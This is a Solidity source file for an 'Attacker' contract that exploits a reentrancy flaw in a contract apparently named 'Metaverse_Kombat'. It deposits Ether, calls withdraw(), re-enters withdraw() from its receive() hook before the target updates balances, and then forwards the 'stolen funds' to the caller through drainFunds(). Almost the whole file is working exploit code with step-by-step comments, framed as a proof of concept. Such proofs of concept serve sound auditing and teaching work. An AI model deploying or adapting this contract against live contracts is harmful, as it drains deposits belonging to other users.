// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerable
 * @dev Interface for the vulnerable contract, which we'll assume is named 'Metaverse_Kombat'.
 * The vulnerability lies in the `withdraw` function, which likely sends Ether
 * to the caller before updating their balance, enabling a reentrancy attack.
 */
interface IVulnerable {
    /**
     * @notice A function to deposit Ether into the contract, establishing a balance.
     */
    function deposit() external payable;

    /**
     * @notice The vulnerable function. It is assumed to transfer the caller's balance
     * back to them but fails to update the user's balance state before the external call (`.call{value: amount}("")`).
     */
    function withdraw() external;
}

/**
 * @title Attacker
 * @dev This contract exploits the reentrancy vulnerability in the `Metaverse_Kombat` contract.
 * The attack proceeds as follows:
 * 1. The attacker calls `attack()`, sending some Ether (e.g., 1 ETH).
 * 2. The `attack()` function deposits this Ether into the vulnerable contract, creating a balance.
 * 3. The `attack()` function then calls `withdraw()` on the vulnerable contract to get the Ether back.
 * 4. The vulnerable contract sends the Ether to this Attacker contract via a low-level call, which triggers the `receive()` function.
 * 5. Inside the `receive()` function, before the vulnerable contract can update the Attacker's balance to zero, the Attacker calls `withdraw()` again.
 * 6. This re-entrant call succeeds because the vulnerable contract's state still shows the Attacker has its original balance. This process repeats, draining the contract.
 */
contract Attacker {
    IVulnerable public target;

    // A counter to limit the number of re-entrant calls to prevent gas exhaustion.
    uint256 public reentranceCount = 0;

    /**
     * @notice Sets the address of the vulnerable contract.
     * @param _target The address of the deployed `Metaverse_Kombat` contract.
     */
    constructor(address _target) {
        target = IVulnerable(_target);
    }

    /**
     * @notice The re-entry point. This function is triggered when the `target` contract sends Ether.
     * It re-enters the `withdraw` function to drain more funds than initially deposited.
     */
    receive() external payable {
        // Limit re-entrancy to avoid running out of gas. A single re-entry is enough for a PoC.
        if (reentranceCount < 1) {
            reentranceCount++;
            // Re-entrant call: While the target's first `withdraw` is still executing,
            // we call it again. The target's balance check passes because its state
            // (the attacker's balance) has not yet been updated.
            target.withdraw();
        }
    }

    /**
     * @notice Initiates the attack. The caller must send Ether with this transaction.
     * The sent Ether is used as the initial deposit in the vulnerable contract.
     */
    function attack() external payable {
        require(msg.value > 0, "Must deposit some ETH to start the attack");

        // Step 1: Deposit funds into the vulnerable contract to create a balance.
        target.deposit{value: msg.value}();

        // Step 2: Trigger the vulnerability by calling the withdraw function.
        // This will cause the target to send ETH back, activating our `receive()` function.
        target.withdraw();
    }

    /**
     * @notice Helper function for the attacker to withdraw all stolen funds from this contract.
     */
    function drainFunds() external {
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to drain funds from attacker contract");
    }
}